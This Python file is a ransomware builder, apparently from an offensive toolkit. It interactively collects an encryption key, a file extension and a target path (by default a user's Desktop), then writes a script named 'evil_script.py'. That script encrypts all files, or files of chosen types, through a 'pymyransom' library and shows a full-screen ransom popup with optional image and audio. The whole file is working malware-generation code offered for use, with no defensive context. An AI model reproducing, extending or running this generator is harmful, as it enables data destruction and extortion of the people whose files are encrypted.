#!/usr/bin/env python3
import base64
import time
from pathlib import Path
from os.path import isfile
import os
import sys
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))
from UI.indicators import print_info, print_prompt, print_warning, print_success


def prompt_input(prompt, default=None, validate=None, error_msg="[!] Invalid input.", allow_empty=False):
    while True:
        default_display = f" (default: {default})" if default else ""
        user_input = input(print_prompt(prompt + default_display + ":") + " ").strip()

        if not user_input and default is not None:
            value = default
        else:
            value = user_input

        if not value and not allow_empty:
            print_warning(error_msg)
            continue
        if value and validate and not validate(value):
            print_warning(error_msg)
            continue
        return value


def generate_ransomware_script():
    print_info("Starting ransomware script generation...")

    extension = prompt_input("File extension to add", ".locked")
    key = prompt_input(
        "16-byte encryption key", "keyfor16bytes123",
        validate=lambda k: len(k.encode()) == 16,
        error_msg="Key must be exactly 16 bytes."
    )

    crypto_utils_dir = Path(__file__).resolve().parent.parent.parent / "crypto_utils"
    crypto_utils_dir.mkdir(parents=True, exist_ok=True)
    key_filename = crypto_utils_dir / f"key_{int(time.time())}.txt"
    with open(key_filename, "w") as keyfile:
        keyfile.write(key)
    print_success(f"Key saved to {key_filename}")

    method = prompt_input(
        "Encrypt all files or specific extensions? (all/some)", "all",
        validate=lambda m: m.lower() in ['all', 'some'],
        error_msg="Please enter 'all' or 'some'."
    ).lower()

    target_path = prompt_input("Path to encrypt", r"C:\Users\Name\Desktop\**")

    image_path = prompt_input(
        "Path to image or GIF to show popup (optional)", None,
        validate=isfile,
        error_msg="Invalid image file path.",
        allow_empty=True
    )
    audio_path = prompt_input(
        "Path to audio file to embed (optional)", None,
        validate=isfile,
        error_msg="Invalid audio file path.",
        allow_empty=True
    )
    window_title = prompt_input("Window title", "Your Files Have Been Encrypted")

    output_filename = prompt_input(
        "Output file name", "evil_script.py",
        validate=lambda f: f.endswith(".py"),
        error_msg="Output filename must end with .py"
    )

    output_dir = Path(__file__).resolve().parent.parent.parent / "output_scripts"
    output_dir.mkdir(parents=True, exist_ok=True)
    full_output_path = output_dir / output_filename

    image_b64 = ""
    if image_path:
        with open(image_path, "rb") as img_file:
            image_b64 = base64.b64encode(img_file.read()).decode()

    audio_b64 = ""
    if audio_path:
        with open(audio_path, "rb") as audio_file:
            audio_b64 = base64.b64encode(audio_file.read()).decode()

    script_lines = [
        "import pymyransom",
        "import base64",
        "import tkinter as tk",
        "from PIL import Image, ImageTk, ImageSequence",
        "import io",
        "import threading",
        "from playsound import playsound",
        "import tempfile",
        "import os",
        "",
        f"WINDOW_TITLE = {repr(window_title)}",
        "",
    ]

    if image_b64:
        script_lines += [
            "def show_image():",
            "    root = tk.Tk()",
            "    root.title(WINDOW_TITLE)",
            "    root.attributes('-zoomed', True) if os.name == 'nt' else root.attributes('-fullscreen', True)",
            "    root.resizable(True, True)",
            "    def toggle_fullscreen(event=None):",
            "        is_fullscreen = root.attributes('-fullscreen')",
            "        root.attributes('-fullscreen', not is_fullscreen)",
            "    root.bind('<F11>', toggle_fullscreen)",
            "    root.bind('<Escape>', lambda e: root.destroy())",
            "    image_data = base64.b64decode(IMAGE_B64)",
            "    image = Image.open(io.BytesIO(image_data))",
            "    canvas = tk.Canvas(root, bg='black', highlightthickness=0)",
            "    canvas.pack(fill=tk.BOTH, expand=True)",
            "    if getattr(image, 'is_animated', False):",
            "        frames = [frame.copy().convert('RGBA') for frame in ImageSequence.Iterator(image)]",
            "        resized_frames = []",
            "        def resize_frames(width, height):",
            "            return [ImageTk.PhotoImage(frame.resize((width, height), Image.LANCZOS)) for frame in frames]",
            "        def on_resize(event):",
            "            nonlocal resized_frames",
            "            resized_frames = resize_frames(event.width, event.height)",
            "        def animate(idx=0):",
            "            if resized_frames:",
            "                canvas.delete('all')",
            "                canvas.create_image(canvas.winfo_width()//2, canvas.winfo_height()//2,",
            "                                    image=resized_frames[idx % len(resized_frames)], anchor='center')",
            "                canvas.image = resized_frames[idx % len(resized_frames)]",
            "            root.after(100, animate, idx + 1)",
            "        root.bind('<Configure>', on_resize)",
            "        resized_frames = resize_frames(root.winfo_width() or 800, root.winfo_height() or 600)",
            "        root.after(0, animate)",
            "    else:",
            "        def resize_static(event=None):",
            "            width = event.width if event else root.winfo_width()",
            "            height = event.height if event else root.winfo_height()",
            "            resized = ImageTk.PhotoImage(image.resize((width, height), Image.LANCZOS))",
            "            canvas.delete('all')",
            "            canvas.create_image(width//2, height//2, image=resized, anchor='center')",
            "            canvas.image = resized",
            "        root.bind('<Configure>', resize_static)",
            "        resize_static()",
            "    root.mainloop()",
            ""
        ]

    if audio_b64:
        script_lines += [
            "def play_audio():",
            "    audio_data = base64.b64decode(AUDIO_B64)",
            "    with tempfile.NamedTemporaryFile(delete=False, suffix='.mp3') as f:",
            "        f.write(audio_data)",
            "        temp_path = f.name",
            "    try:",
            "        playsound(temp_path)",
            "    finally:",
            "        os.remove(temp_path)",
            ""
        ]

    script_lines.append(f"IMAGE_B64 = '''{image_b64}'''")
    script_lines.append(f"AUDIO_B64 = '''{audio_b64}'''")

    if image_b64:
        script_lines.append("threading.Thread(target=show_image).start()")
    if audio_b64:
        script_lines.append("threading.Thread(target=play_audio, daemon=True).start()")

    script_lines += [
        "",
        f"Victim = pymyransom.makeMyRansomware(",
        f"    your_extension=\"{extension}\",",
        f"    key=b\"{key}\",",
        ")",
        f"startpath = r'''{target_path}'''",
    ]

    if method == "all":
        script_lines.append("Victim.Encryptor(startpath)")
    else:
        extlist = prompt_input("Extensions to encrypt (comma separated)", ".txt,.docx")
        extlist_formatted = "[" + ", ".join([f'"{ext.strip()}"' for ext in extlist.split(",")]) + "]"
        script_lines.append(f"Victim.extlist = {extlist_formatted}")
        script_lines.append("Victim.Encrypt_Some_Ext(startpath)")

    with open(full_output_path, "w") as f:
        f.write("\n".join(script_lines))

    print_success(f"Script saved to {full_output_path}")

if __name__ == "__main__":
    generate_ransomware_script()
